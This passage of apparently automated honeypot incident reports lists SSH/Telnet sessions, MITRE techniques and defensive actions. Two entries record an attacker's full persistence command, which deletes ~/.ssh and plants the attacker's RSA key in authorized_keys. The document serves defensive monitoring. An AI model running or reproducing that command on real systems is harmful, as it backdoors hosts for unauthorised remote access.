| **First Seen** | 2026-07-02 11:08 |
| **Last Seen** | 2026-07-02 11:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:08:20` | `cowrie.session.connect` |
| `2026-07-02 11:08:20` | `cowrie.client.version` |
| `2026-07-02 11:08:20` | `cowrie.client.kex` |
| `2026-07-02 11:08:20` | `cowrie.login.success` |
| `2026-07-02 11:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.64[.]35` to AbuseIPDB if not already reported
- [ ] Block `51.75.64[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14adc0ec0fa6

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 11:10 |
| **Last Seen** | 2026-07-02 11:10 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:10:30` | `cowrie.session.connect` |
| `2026-07-02 11:10:31` | `cowrie.client.version` |
| `2026-07-02 11:10:31` | `cowrie.client.kex` |
| `2026-07-02 11:10:37` | `cowrie.login.success` |
| `2026-07-02 11:10:41` | `cowrie.session.params` |
| `2026-07-02 11:10:41` | `cowrie.command.input` |
| `2026-07-02 11:10:42` | `cowrie.log.closed` |
| `2026-07-02 11:10:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23c63b941eef

| Field | Detail |
|---|---|
| **Source IP** | `14.22.81[.]14` |
| **First Seen** | 2026-07-02 11:15 |
| **Last Seen** | 2026-07-02 11:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:15:41` | `cowrie.session.connect` |
| `2026-07-02 11:15:41` | `cowrie.client.version` |
| `2026-07-02 11:15:43` | `cowrie.client.kex` |
| `2026-07-02 11:15:44` | `cowrie.login.success` |
| `2026-07-02 11:15:45` | `cowrie.session.params` |
| `2026-07-02 11:15:45` | `cowrie.command.input` |
| `2026-07-02 11:15:45` | `cowrie.log.closed` |
| `2026-07-02 11:15:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.22.81[.]14` to AbuseIPDB if not already reported
- [ ] Block `14.22.81[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad1ba5f3fab2

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 11:16 |
| **Last Seen** | 2026-07-02 11:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:16:20` | `cowrie.session.connect` |
| `2026-07-02 11:16:21` | `cowrie.client.version` |
| `2026-07-02 11:16:21` | `cowrie.client.kex` |
| `2026-07-02 11:16:22` | `cowrie.login.success` |
| `2026-07-02 11:16:24` | `cowrie.session.params` |
| `2026-07-02 11:16:24` | `cowrie.command.input` |
| `2026-07-02 11:16:24` | `cowrie.log.closed` |
| `2026-07-02 11:16:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29e56eefc4ff

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 11:16 |
| **Last Seen** | 2026-07-02 11:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:16:30` | `cowrie.session.connect` |
| `2026-07-02 11:16:30` | `cowrie.client.version` |
| `2026-07-02 11:16:30` | `cowrie.client.kex` |
| `2026-07-02 11:16:30` | `cowrie.login.success` |
| `2026-07-02 11:16:32` | `cowrie.session.params` |
| `2026-07-02 11:16:32` | `cowrie.command.input` |
| `2026-07-02 11:16:32` | `cowrie.log.closed` |
| `2026-07-02 11:16:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76d133ff7c5e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 11:21 |
| **Last Seen** | 2026-07-02 11:21 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:21:39` | `cowrie.session.connect` |
| `2026-07-02 11:21:40` | `cowrie.client.version` |
| `2026-07-02 11:21:40` | `cowrie.client.kex` |
| `2026-07-02 11:21:46` | `cowrie.login.success` |
| `2026-07-02 11:21:49` | `cowrie.session.params` |
| `2026-07-02 11:21:49` | `cowrie.command.input` |
| `2026-07-02 11:21:51` | `cowrie.log.closed` |
| `2026-07-02 11:21:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e526494fe2d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 11:28 |
| **Last Seen** | 2026-07-02 11:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:28:17` | `cowrie.session.connect` |
| `2026-07-02 11:28:17` | `cowrie.client.version` |
| `2026-07-02 11:28:17` | `cowrie.client.kex` |
| `2026-07-02 11:28:17` | `cowrie.login.success` |
| `2026-07-02 11:28:19` | `cowrie.session.params` |
| `2026-07-02 11:28:19` | `cowrie.command.input` |
| `2026-07-02 11:28:19` | `cowrie.log.closed` |
| `2026-07-02 11:28:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb332a96ada5

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 11:30 |
| **Last Seen** | 2026-07-02 11:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:30:15` | `cowrie.session.connect` |
| `2026-07-02 11:30:15` | `cowrie.client.version` |
| `2026-07-02 11:30:15` | `cowrie.client.kex` |
| `2026-07-02 11:30:17` | `cowrie.login.success` |
| `2026-07-02 11:30:18` | `cowrie.session.params` |
| `2026-07-02 11:30:18` | `cowrie.command.input` |
| `2026-07-02 11:30:19` | `cowrie.log.closed` |
| `2026-07-02 11:30:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2028f328254b

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 11:32 |
| **Last Seen** | 2026-07-02 11:32 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:32:42` | `cowrie.session.connect` |
| `2026-07-02 11:32:43` | `cowrie.client.version` |
| `2026-07-02 11:32:43` | `cowrie.client.kex` |
| `2026-07-02 11:32:48` | `cowrie.login.success` |
| `2026-07-02 11:32:51` | `cowrie.session.params` |
| `2026-07-02 11:32:51` | `cowrie.command.input` |
| `2026-07-02 11:32:53` | `cowrie.log.closed` |
| `2026-07-02 11:32:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fc9d70a7799

| Field | Detail |
|---|---|
| **Source IP** | `43.172.74[.]146` |
| **First Seen** | 2026-07-02 11:35 |
| **Last Seen** | 2026-07-02 11:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:35:51` | `cowrie.session.connect` |
| `2026-07-02 11:35:51` | `cowrie.telnet.option` |
| `2026-07-02 11:35:51` | `cowrie.telnet.option` |
| `2026-07-02 11:36:51` | `cowrie.login.success` |
| `2026-07-02 11:36:52` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `43.172.74[.]146` to AbuseIPDB if not already reported
- [ ] Block `43.172.74[.]146` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74c20fa1c77c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 11:40 |
| **Last Seen** | 2026-07-02 11:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:40:16` | `cowrie.session.connect` |
| `2026-07-02 11:40:16` | `cowrie.client.version` |
| `2026-07-02 11:40:16` | `cowrie.client.kex` |
| `2026-07-02 11:40:17` | `cowrie.login.success` |
| `2026-07-02 11:40:18` | `cowrie.session.params` |
| `2026-07-02 11:40:18` | `cowrie.command.input` |
| `2026-07-02 11:40:18` | `cowrie.log.closed` |
| `2026-07-02 11:40:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4554d531a7df

| Field | Detail |
|---|---|
| **Source IP** | `34.77.179[.]1` |
| **First Seen** | 2026-07-02 11:42 |
| **Last Seen** | 2026-07-02 11:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:42:13` | `cowrie.session.connect` |
| `2026-07-02 11:42:13` | `cowrie.login.success` |
| `2026-07-02 11:42:14` | `cowrie.session.params` |
| `2026-07-02 11:42:14` | `cowrie.command.input` |
| `2026-07-02 11:42:14` | `cowrie.command.input` |
| `2026-07-02 11:42:14` | `cowrie.command.failed` |
| `2026-07-02 11:42:14` | `cowrie.command.input` |
| `2026-07-02 11:42:14` | `cowrie.log.closed` |
| `2026-07-02 11:42:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.179[.]1` to AbuseIPDB if not already reported
- [ ] Block `34.77.179[.]1` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-565790d4fc3d

| Field | Detail |
|---|---|
| **Source IP** | `34.77.179[.]1` |
| **First Seen** | 2026-07-02 11:42 |
| **Last Seen** | 2026-07-02 11:42 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:42:27` | `cowrie.session.connect` |
| `2026-07-02 11:42:27` | `cowrie.login.success` |
| `2026-07-02 11:42:28` | `cowrie.session.params` |
| `2026-07-02 11:42:28` | `cowrie.command.input` |
| `2026-07-02 11:42:28` | `cowrie.command.failed` |
| `2026-07-02 11:42:44` | `cowrie.log.closed` |
| `2026-07-02 11:42:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.179[.]1` to AbuseIPDB if not already reported
- [ ] Block `34.77.179[.]1` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b61df3b35be4

| Field | Detail |
|---|---|
| **Source IP** | `34.77.179[.]1` |
| **First Seen** | 2026-07-02 11:42 |
| **Last Seen** | 2026-07-02 11:42 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:42:29` | `cowrie.session.connect` |
| `2026-07-02 11:42:29` | `cowrie.login.success` |
| `2026-07-02 11:42:29` | `cowrie.session.params` |
| `2026-07-02 11:42:29` | `cowrie.command.input` |
| `2026-07-02 11:42:44` | `cowrie.log.closed` |
| `2026-07-02 11:42:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.179[.]1` to AbuseIPDB if not already reported
- [ ] Block `34.77.179[.]1` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4d1cd257d16

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 11:43 |
| **Last Seen** | 2026-07-02 11:43 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:43:30` | `cowrie.session.connect` |
| `2026-07-02 11:43:31` | `cowrie.client.version` |
| `2026-07-02 11:43:31` | `cowrie.client.kex` |
| `2026-07-02 11:43:37` | `cowrie.login.success` |
| `2026-07-02 11:43:40` | `cowrie.session.params` |
| `2026-07-02 11:43:40` | `cowrie.command.input` |
| `2026-07-02 11:43:42` | `cowrie.log.closed` |
| `2026-07-02 11:43:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5070c5ca047

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 11:44 |
| **Last Seen** | 2026-07-02 11:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:44:13` | `cowrie.session.connect` |
| `2026-07-02 11:44:13` | `cowrie.client.version` |
| `2026-07-02 11:44:13` | `cowrie.client.kex` |
| `2026-07-02 11:44:16` | `cowrie.login.success` |
| `2026-07-02 11:44:17` | `cowrie.session.params` |
| `2026-07-02 11:44:17` | `cowrie.command.input` |
| `2026-07-02 11:44:18` | `cowrie.log.closed` |
| `2026-07-02 11:44:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9ef7690cae4

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-02 11:52 |
| **Last Seen** | 2026-07-02 11:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:52:21` | `cowrie.session.connect` |
| `2026-07-02 11:52:21` | `cowrie.client.version` |
| `2026-07-02 11:52:21` | `cowrie.client.kex` |
| `2026-07-02 11:52:21` | `cowrie.login.success` |
| `2026-07-02 11:52:22` | `cowrie.session.params` |
| `2026-07-02 11:52:22` | `cowrie.command.input` |
| `2026-07-02 11:52:22` | `cowrie.log.closed` |
| `2026-07-02 11:52:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb0f4b326668

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 11:54 |
| **Last Seen** | 2026-07-02 11:54 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:54:21` | `cowrie.session.connect` |
| `2026-07-02 11:54:22` | `cowrie.client.version` |
| `2026-07-02 11:54:22` | `cowrie.client.kex` |
| `2026-07-02 11:54:28` | `cowrie.login.success` |
| `2026-07-02 11:54:32` | `cowrie.session.params` |
| `2026-07-02 11:54:32` | `cowrie.command.input` |
| `2026-07-02 11:54:33` | `cowrie.log.closed` |
| `2026-07-02 11:54:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-985ce7378b18

| Field | Detail |
|---|---|
| **Source IP** | `78.44.192[.]210` |
| **First Seen** | 2026-07-02 11:57 |
| **Last Seen** | 2026-07-02 11:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:57:41` | `cowrie.session.connect` |
| `2026-07-02 11:57:41` | `cowrie.client.version` |
| `2026-07-02 11:57:41` | `cowrie.client.kex` |
| `2026-07-02 11:57:42` | `cowrie.login.success` |
| `2026-07-02 11:57:42` | `cowrie.session.params` |
| `2026-07-02 11:57:42` | `cowrie.command.input` |
| `2026-07-02 11:57:42` | `cowrie.command.failed` |
| `2026-07-02 11:57:43` | `cowrie.log.closed` |
| `2026-07-02 11:57:43` | `cowrie.session.params` |
| `2026-07-02 11:57:43` | `cowrie.command.input` |
| `2026-07-02 11:57:44` | `cowrie.session.file_download` |
| `2026-07-02 11:57:44` | `cowrie.log.closed` |
| `2026-07-02 11:57:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.44.192[.]210` to AbuseIPDB if not already reported
- [ ] Block `78.44.192[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b71aed53fd6

| Field | Detail |
|---|---|
| **Source IP** | `78.44.192[.]210` |
| **First Seen** | 2026-07-02 11:57 |
| **Last Seen** | 2026-07-02 11:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:57:44` | `cowrie.session.connect` |
| `2026-07-02 11:57:44` | `cowrie.client.version` |
| `2026-07-02 11:57:44` | `cowrie.client.kex` |
| `2026-07-02 11:57:44` | `cowrie.login.success` |
| `2026-07-02 11:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.44.192[.]210` to AbuseIPDB if not already reported
- [ ] Block `78.44.192[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-164b05e040ce

| Field | Detail |
|---|---|
| **Source IP** | `78.44.192[.]210` |
| **First Seen** | 2026-07-02 11:57 |
| **Last Seen** | 2026-07-02 11:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:57:44` | `cowrie.session.connect` |
| `2026-07-02 11:57:44` | `cowrie.client.version` |
| `2026-07-02 11:57:45` | `cowrie.client.kex` |
| `2026-07-02 11:57:45` | `cowrie.login.success` |
| `2026-07-02 11:57:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.44.192[.]210` to AbuseIPDB if not already reported
- [ ] Block `78.44.192[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d470dcc8f661

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 11:58 |
| **Last Seen** | 2026-07-02 11:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 11:58:00` | `cowrie.session.connect` |
| `2026-07-02 11:58:00` | `cowrie.client.version` |
| `2026-07-02 11:58:00` | `cowrie.client.kex` |
| `2026-07-02 11:58:02` | `cowrie.login.success` |
| `2026-07-02 11:58:04` | `cowrie.session.params` |
| `2026-07-02 11:58:04` | `cowrie.command.input` |
| `2026-07-02 11:58:04` | `cowrie.log.closed` |
| `2026-07-02 11:58:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f33db6dc85c

| Field | Detail |
|---|---|
| **Source IP** | `143.95.209[.]223` |
| **First Seen** | 2026-07-02 12:04 |
| **Last Seen** | 2026-07-02 12:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:04:32` | `cowrie.session.connect` |
| `2026-07-02 12:04:32` | `cowrie.client.version` |
| `2026-07-02 12:04:32` | `cowrie.client.kex` |
| `2026-07-02 12:04:32` | `cowrie.login.success` |
| `2026-07-02 12:04:33` | `cowrie.session.params` |
| `2026-07-02 12:04:33` | `cowrie.command.input` |
| `2026-07-02 12:04:33` | `cowrie.command.failed` |
| `2026-07-02 12:04:33` | `cowrie.log.closed` |
| `2026-07-02 12:04:34` | `cowrie.session.params` |
| `2026-07-02 12:04:34` | `cowrie.command.input` |
| `2026-07-02 12:04:34` | `cowrie.session.file_download` |
| `2026-07-02 12:04:34` | `cowrie.log.closed` |
| `2026-07-02 12:04:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.95.209[.]223` to AbuseIPDB if not already reported
- [ ] Block `143.95.209[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-088ff74215ef

| Field | Detail |
|---|---|
| **Source IP** | `143.95.209[.]223` |
| **First Seen** | 2026-07-02 12:04 |
| **Last Seen** | 2026-07-02 12:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:04:34` | `cowrie.session.connect` |
| `2026-07-02 12:04:34` | `cowrie.client.version` |
| `2026-07-02 12:04:35` | `cowrie.client.kex` |
| `2026-07-02 12:04:35` | `cowrie.login.success` |
| `2026-07-02 12:04:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.95.209[.]223` to AbuseIPDB if not already reported
- [ ] Block `143.95.209[.]223` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f83ebb81d3f

| Field | Detail |
|---|---|
| **Source IP** | `143.95.209[.]223` |
| **First Seen** | 2026-07-02 12:04 |
| **Last Seen** | 2026-07-02 12:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:04:35` | `cowrie.session.connect` |
| `2026-07-02 12:04:35` | `cowrie.client.version` |
| `2026-07-02 12:04:36` | `cowrie.client.kex` |
| `2026-07-02 12:04:36` | `cowrie.login.success` |
| `2026-07-02 12:04:36` | `cowrie.session.closed` |

**Recommended Actions:**
